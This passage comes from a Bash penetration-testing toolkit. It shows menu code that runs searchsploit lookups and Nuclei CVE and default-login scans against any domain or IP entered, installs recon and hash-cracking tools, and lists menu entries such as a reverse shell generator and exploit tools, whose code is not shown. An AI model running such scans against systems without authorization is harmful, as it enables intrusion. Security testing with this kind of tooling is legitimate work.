                generate_payloads
                ;;
            2)
                read -e -p "Enter the text to search: " search_term
                clear
                searchsploit "$search_term" > "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt"
                last_output=$(cat "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt")
                cat "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt"
                ;;
            3)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to sanitize filenames
sanitize_filename() {
    echo "$1" | tr -d '\/\\'
}

# Function to perform OSINT with Nuclei
osint_nuclei() {
    show_info_panel
    read -e -p "Enter the target domain or IP: " target

    sanitized_target=$(sanitize_filename "$target")
    hora=$(date +"%m-%d-%H:%M")
    output_file="$BASE_DIR/osint/nuclei_${sanitized_target}_$hora"

    echo -e "${BLUE}Select the type of Nuclei scan:${NC}"
    echo -e "1) Basic Scan: A simple scan with default settings."
    echo -e "2) Silent Scan: A scan with no much noise."
    echo -e "3) Web Application Scan: Focuses on web vulnerabilities and default logins."
    echo -e "4) Network Infrastructure Scan: Scans for CVEs, misconfigurations, and exposed services."
    echo -e "5) Comprehensive Scan: A thorough scan including all types of vulnerabilities."
    echo -e "6) Custom Scan: Customize your scan with specific arguments."
    read -e -p "Scan Type: " scan_type

    options=""

    case $scan_type in
        1)
            options="-o $output_file"
            ;;
        2)
            options="-silent -o $output_file"
            ;;
        3)
            options="-t cves -t vulnerabilities -t default-logins -o $output_file"
            ;;
        4)
            options="-t cves -t misconfigurations -t default-logins -t exposed-panels -o $output_file"
            ;;
        5)
            options="-t cves -t vulnerabilities -t misconfigurations -t default-logins -t exposed-panels -t exposures -o $output_file"
            ;;
        6)
            echo -e "${BLUE}Select additional options for the Custom Scan:${NC}"
            echo -e "1) -nt: Run only new templates"
            echo -e "2) -tags: Templates to run based on tags"
            echo -e "3) -a: Templates to run based on authors"
            echo -e "4) -s: Templates to run based on severity"
            echo -e "5) -pt: Templates to run based on protocol type"
            echo -e "6) -rl: Maximum number of requests to send per second"
            echo -e "7) -timeout: Time to wait before timeout"
            echo -e "8) -retries: Number of retries for a failed request"
            echo -e "9) -bulk-size: Maximum number of hosts to be analyzed in parallel"
            echo -e "10) -jsonl: Write output in JSONL format"
            echo -e "11) -stats: Display statistics about the running scan"
            echo -e "12) -update: Update nuclei engine to the latest released version"
            echo -e "13) -ut: Update nuclei-templates to latest released version"
            echo -e "14) -json-export: Export results in JSON format"
            echo -e "15) -me: Export results in Markdown format"
            read -e -p "Enter the options you want to use (comma-separated): " nuclei_options

            if [ "$nuclei_options" != "1" ]; then
                IFS=',' read -ra opts <<< "$nuclei_options"
                for opt in "${opts[@]}"; do
                    case $opt in
                        1) options+=" -nt" ;;
                        2) read -e -p "Enter the tags: " tags; options+=" -tags $tags" ;;
                        3) read -e -p "Enter the authors: " authors; options+=" -a $authors" ;;
                        4) read -e -p "Enter the severity: " severity; options+=" -s $severity" ;;
                        5) read -e -p "Enter the protocol types: " protocol; options+=" -pt $protocol" ;;
                        6) read -e -p "Enter the rate limit: " rate; options+=" -rl $rate" ;;
                        7) read -e -p "Enter the timeout: " timeout; options+=" -timeout $timeout" ;;
                        8) read -e -p "Enter the number of retries: " retries; options+=" -retries $retries" ;;
                        9) read -e -p "Enter the bulk size: " bulk_size; options+=" -bulk-size $bulk_size" ;;
                        10) options+=" -jsonl" ;;
                        11) options+=" -stats" ;;
                        12) options+=" -update" ;;
                        13) options+=" -ut" ;;
                        14) options+=" -json-export $output_file.json" ;;
                        15) options+=" -me $output_file.md" ;;
                        *) echo -e "${RED}[-] Invalid option: $opt${NC}" ;;
                    esac
                done
            fi
            ;;
        *)
            echo -e "${RED}[-] Invalid scan type.${NC}"
            return
            ;;
    esac

    echo -e "${GREEN}[+] Running Nuclei with options: $options${NC}"
    nuclei -u "$target" $options
    echo -e "${GREEN}[+] Nuclei scan completed. Results saved in $output_file${NC}"
}

check_install_dependencies() {
    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei")

    echo -e "${BLUE}[+] Checking and installing dependencies...${NC}"

    for dep in "${dependencies[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${YELLOW}[-] $dep is not installed. Installing...${NC}"
            if [[ $dep == "theharvester" ]]; then
                pip install theHarvester
            elif [[ $dep == "nuclei" || $dep == "finalrecon" ]]; then
                sudo apt install -y nuclei
            else
                sudo apt-get install -y $dep
            fi
        else
            echo -e "${GREEN}[+] $dep is already installed.${NC}"
        fi
    done

    if ! command -v spiderfoot &> /dev/null; then
        echo -e "${YELLOW}[-] spiderfoot is not installed. Installing...${NC}"
        pipx install spiderfoot
    else
        echo -e "${GREEN}[+] spiderfoot is already installed.${NC}"
    fi
    clear
    echo -e "${GREEN}[+] All dependencies are checked and installed.${NC}"
}

# Principal function
main_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an Option:${NC}"
        echo -e "1) Configure IP"
        echo -e "2) Create directories"
        echo -e "3) NMAP scans"
        echo -e "4) Web Tools"
        echo -e "5) OSINT Tools"
        echo -e "6) Exploit Tools"
        echo -e "7) CheatSheets"
        echo -e "8) Hash Crack"
        echo -e "9) Reverse Shell Generator"
        echo -e "10) Download Tools"
        echo -e "11) Generate Report"
        echo -e "12) Check and Install Dependencies"
        echo -e "13) Save & Exit"
        read -e -p "Option: " main_option

        clear
        case $main_option in
            1)
                set_ip
                save_results
                ;;
            2)
                create_directories
                save_results
                ;;
            3)
                scan_nmap
                ;;   
            4)
                web_tools_menu
                ;;
            5)
                osint_tools_menu
                ;;
            6)
                exploit_tools_menu
                ;;
            7)
                show_cheatsheets
                ;;
            8)
                crack_with_hashcat
                ;;
            9)
                generate_reverse_shell
                ;;
            10)
                download_tools
                ;;
            11)
                save_report
                ;;
            12)
                check_install_dependencies
                ;;
            13)
                save_results
                echo -e "${GREEN}[+] Exiting the script.${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
        echo -e "${last_output}"
    done
}

# Show banner at script start
show_banner

# Check if script is run without -c argument
if [[ "$1" != "-c" ]]; then
    create_directories
fi

# Check the arguments
while getopts ":c:h" opt; do
    case ${opt} in
        c )
            load_results "$OPTARG"
            ;;
        h )
            show_help
            exit 0
            ;;
        \? )
            echo -e "${RED}[-] Invalid option: -$OPTARG${NC}" >&2
            show_help
            exit 1
            ;;
        : )
            echo -e "${RED}[-] The Option -$OPTARG requires an argument.${NC}" >&2
            show_help
            exit 1
            ;;
    esac
done

# Run the main menu
main_menu
